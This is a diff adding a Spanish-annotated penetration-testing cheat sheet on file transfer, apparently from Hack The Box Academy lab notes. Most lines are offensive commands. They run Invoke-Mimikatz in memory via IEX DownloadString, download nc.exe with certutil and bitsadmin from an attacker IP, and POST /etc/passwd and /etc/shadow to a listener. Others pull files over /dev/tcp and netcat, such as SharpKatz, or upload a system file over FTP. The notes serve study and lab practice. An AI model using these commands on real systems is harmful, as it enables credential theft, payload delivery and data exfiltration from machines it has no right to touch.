@@ -1,0 +1,121 @@
+| **Command** | **Description** |
+| --------------|-------------------|
+| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
+| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
+| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
+| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
+| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
+| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
+| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
+| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
+| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
+| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
+| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent | 
+
+                                #// ---         FILE TRANSFERENCE       ---\\
+---     UPLOAD from Linux       ---
+    Base64
+md5sum file_name
+#Verificamos el hash del file
+cat file_name |base64 -w 0;echo
+#Encodeamos el file en base63
+
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+#Certificado autofirmado
+python3 -m uploadserver 443 --server-certificate /root/server.pem
+#Iniciar servbidor c/certf.
+
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+(insecure porque usamos un certf autofirm en el que confiamos)
+
+    SMB server
+sudo impacket-smbserver share -smb2support /smbshare -user test -password test
+#Creo servidor smb con soporte a la v2 con carpeta compartida llamada share con credenciales test:test
+
+
+---     UPLOAD to Windows       ---
+    Base64
+[IO.File]::WriteAllBytes("C:\path\file_name", [Convert]::FromBase64String("base64_hash"))
+#Decodeamos el hash
+Get-FileHash C:\path\file_name -Algorithm md5
+#Verificamos el hash y comparamos con el de linux
+
+    Web downloads
+(New-Object Net.WebClient).DownloadFile('https://url','C:\path\output_file')
+#Descargo de X url y guardo como output en path.
+#Con --FTP-- es igual pero en vez de http pongo ftp
+IEX (New-Object Net.WebClient).DownloadString('https://url')
+#Ejecuto en memoria el programa
+
+    SMB server
+net use n: \\ip_attacker\folder /user:test test
+#Me conecto mediante las credenciales necesarias y defino a n como la ip y el folder creado
+
+---     Download to linux       ---
+    Base64
+echo 'base64_string | base64 -d > output_file'
+#Decode base64
+
+    SMB server
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+#Creo server SMB
+
+    FTP server
+sudo python3 -m pyftpdlib --port 21 --write
+#Ftp server con capacidad de escritura
+
+---     Download from windows   ---
+    Base64
+[Convert]::ToBase64String((Get-Content -path "C:\path\file" -Encoding byte))
+#Convierto file en base64
+
+    SMB server
+dir \\192.168.49.128\DavWWWRoot
+#Me conecto al sv smb de linux
+copy C:\path\file \\192.168.49.129\DavWWWRoot\
+#Copio el file a la maquina
+
+    FTP server
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+
+
+---     NetCat  ---
+nc -l -p 8000 > SharpKatz.exe
+#Pongo la maquinan victima en escucha
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+#Desde mi linux mando elk archivo indicando (con -q 0) que se cierre la conecc una vez finalizada la transf
+
+sudo nc -l -p 80 -q 0 < SharpKatz.exe
+#Pongo mi linux en escucha compartiendo un file
+nc 192.168.49.128 80 > SharpKatz.exe
+#Me conecto con la maquina victima a mi nc para recibir el arrchivo
+cat < /dev/tcp/192.168.49.128/80 > SharpKatz.exe
+#Si la victima no tiene nc pero si bash
+
+---     PDR     ---
+rdesktop 10.10.10.132 -d HTB -u usr -p 'Pass' -r disk:linux='/home/user/rdesktop/files'
+#Monto una carpeta rdesktop en mi linux para pasar archivos
+xfreerdp /v:10.10.10.132 /d:HTB /u:usr /p:'Pass' /drive:linux,/home/plaintext/htb/academy/filetransfer
+#Monto una carpeta xfreerdp en mi linux para pasar archivos
+
+---     SSL     ---
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+#Creo certificado
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+#Creo servidor con el certificado
+        ##---   GTFOBins mas info       ---##
+
+---     Certutil        ---
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+#Tiene antimalware pero es como wget de linux
